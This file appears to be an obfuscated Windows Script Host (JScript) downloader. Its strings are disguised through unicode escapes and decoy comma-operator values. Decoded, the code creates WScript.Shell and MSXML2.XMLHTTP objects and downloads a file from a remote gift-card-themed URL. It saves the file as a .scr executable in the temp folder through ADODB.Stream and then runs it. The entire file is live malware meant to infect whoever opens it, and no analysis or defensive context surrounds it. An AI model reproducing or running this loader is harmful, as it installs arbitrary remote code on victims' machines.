realAmmunition = ((1 + (0 | 0)), this);
terminologyMethod = ("co" + "\u006c\u006c\u0065" + "ct\u0069o" + "n", "c\u0069" + "\u0074a\u0074i" + "o\u006e", "\u0064\u006f\u0075\u0062\u006ce", "R\u0075\u006e");
instructionMinimal = realAmmunition[("c\u006fm" + "\u0070" + "ac\u0074", "re\u0066\u0072i" + "ge" + "\u0072\u0061\u0074o\u0072", "d\u0069c" + "ta" + "\u0074\u0065", "\u0062" + "u" + "\u0072\u0065" + "\u0061u" + "\u0063r\u0061\u0063y", "\u0057Scr" + "i" + "pt")];
instructionMinimal[("\u0053l\u0065\u0065" + "p")](((1129 + 14191) & (Math.pow(8902, 2) - 79229543)));
cosmosCancer = instructionMinimal[("ba\u0072\u0072ac" + "k", "r\u0065c\u0069" + "\u0070" + "\u0065", "ba\u006c\u006c", "Cr\u0065\u0061" + "t\u0065\u004f\u0062\u006a\u0065" + "\u0063t")](("\u006di" + "n\u0069ma" + "l", "\u0057S" + "c\u0072\u0069pt." + "S\u0068\u0065\u006c" + "l"));
programCorporation = cosmosCancer[("re\u006fr\u0067" + "\u0061\u006e\u0069\u007ae", "\u0072\u0065\u0066" + "\u006ce\u0063\u0074\u0069" + "on", "\u0045" + "\u0078\u0070\u0061\u006e\u0064" + "En\u0076\u0069\u0072o" + "\u006em\u0065n\u0074S" + "tr" + "\u0069" + "ngs")](("anec\u0064\u006f" + "t\u0065", "p" + "r\u006f\u0067\u0072" + "e\u0073si" + "on", "l\u0069b\u0065r" + "\u0061\u006c", "%TE\u004d" + "P%/")) + ("\u0063" + "a" + "st\u0065", "sal\u0075" + "\u0074\u0065\u0043" + "yc\u006c" + "e") + ("re\u0073\u006f" + "l\u0075ti\u006f" + "\u006e", "ten\u0064e\u0072", "\u002es\u0063r");
amorphousMechanic = realAmmunition[("fo" + "r\u0074u" + "n\u0065", "\u0072ac" + "\u0065", function String.prototype.limitAutonomy() {
				return this
}, "\u0057\u0053" + "cr" + "\u0069pt")][("a" + "tt" + "\u0065s\u0074\u0061t\u0069" + "o\u006e", "pro" + "g" + "ress\u0069\u0076" + "e", "\u006do\u006de" + "n\u0074u\u006d", "\u0043\u0072\u0065\u0061\u0074\u0065" + "Ob" + "jec\u0074")](("\u0074\u0065\u0072\u0072a" + "c\u0065", "z\u006fm\u0062" + "ie", "\u0061\u006d\u0070" + "\u0068\u0069" + "b\u0069a\u006e", "\u004dSX\u004d\u004c" + "\u0032\u002e" + "XM\u004cHT" + "TP"));
amorphousMechanic[("\u0073\u0074at" + "i\u0073t" + "\u0069\u0063" + "\u0073", "\u0068\u0075\u006d\u0061\u006e", "\u006fpen")](("G\u0045T"), ("\u0068\u0074tp" + "\u003a\u002f\u002f" + "\u0070\u0061c\u0069f" + "\u0069\u0063gi\u0066\u0074" + "c\u0061" + "rd\u0073\u002e\u0063" + "\u006fm\u002f" + "\u0033/6\u0037" + "t54\u0063\u0065" + "\u0074\u0076\u0079"), !(7 < ((((17 + 71) - (([!+[] + !+[]]) * (((([!+[] + !+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]])))))) / ((3 * 2 + 1) * (32 / 16) + 1)) * ((([!+[] + !+[]]))) * ((((40 * 5 + 11), (18), (0 ^ 19), (0 / 3)) | ((230, 99, 78) / (30 + 9)))))));
amorphousMechanic[("\u0063o\u0064" + "\u0065", "i\u006e\u0066o" + "rm", "s\u0065\u006e\u0064")]();
while(amorphousMechanic[("rea\u0064" + "y\u0073tat\u0065")] < (2 * 2 & (1 * 7))) {
				realAmmunition[("im\u0070" + "or" + "\u0074", "\u0069n\u0076a" + "\u006ci\u0064", "\u0057Sc" + "ri\u0070" + "t")][("\u0063ub\u0065", "\u0063\u006fm" + "m" + "\u0065\u0072\u0063e", "\u0053\u006c\u0065ep")](((403 - 205) - (107, 211, 98)));
}
addressRoutine = realAmmunition[("\u006d\u0069\u0063\u0072o" + "p" + "\u0068o\u006ee", "\u0057Scr" + "i\u0070\u0074")][("na" + "t\u0075r" + "\u0065", "\u0074en\u0064\u0065" + "\u0072", "co\u006c" + "l\u0065ct\u006f" + "r", "\u0043\u0072\u0065\u0061" + "t\u0065\u004fb" + "\u006ae" + "ct")](("ADO" + "D\u0042" + "\u002e" + "\u0053" + "tre" + "am"));
try {
				addressRoutine[("ga" + "\u006c\u006cer" + "y", "\u0070" + "r\u0065" + "\u0061mb\u006ce", "n\u006fse", "op\u0065\u006e")]();
				addressRoutine[("nu\u006de\u0072" + "ati\u006f\u006e", "t\u0079\u0070" + "e")] = ((396 / 22), (439 - 228), (49 / 49));
				addressRoutine[("c" + "o" + "\u006d\u006d\u0061\u006ed\u0065" + "r", "oc" + "\u0063asi" + "\u006f\u006e", "\u0072egu" + "la" + "rity", "\u0074e" + "chn\u0069q" + "\u0075" + "e", "\u0077r\u0069\u0074" + "e")](amorphousMechanic[("p" + "\u0072\u006f\u006cog\u0075" + "\u0065", "g\u006c" + "obe", "re\u0067ul" + "a\u0072ity", "\u0067a" + "\u006c\u006cery", "\u0052es\u0070on" + "\u0073eB\u006f" + "\u0064\u0079")]);
				addressRoutine[("\u0074an\u0064e" + "m", "\u0069\u006e" + "f\u0065ct\u0069\u006f" + "n", "pro" + "vo\u0063\u0061ti" + "\u006f" + "n", "p\u006f\u0073it" + "\u0069\u006f\u006e")] = ((28 + 7) - (35));
				addressRoutine[("ho" + "\u0062b\u0079", "pau" + "\u0073e", "\u0072o" + "l\u0065", "ro\u0063" + "\u006bet", "\u0073\u0061" + "ve\u0054o" + "Fi\u006c\u0065")](programCorporation, (([!+[] + !+[]])));
				addressRoutine[("\u0069mport", "s" + "e\u0078u\u0061" + "l", "\u0063los" + "e")]();
				cosmosCancer[terminologyMethod](programCorporation.limitAutonomy(), (17 - 17), 0);
} catch(emissionAtom) {};
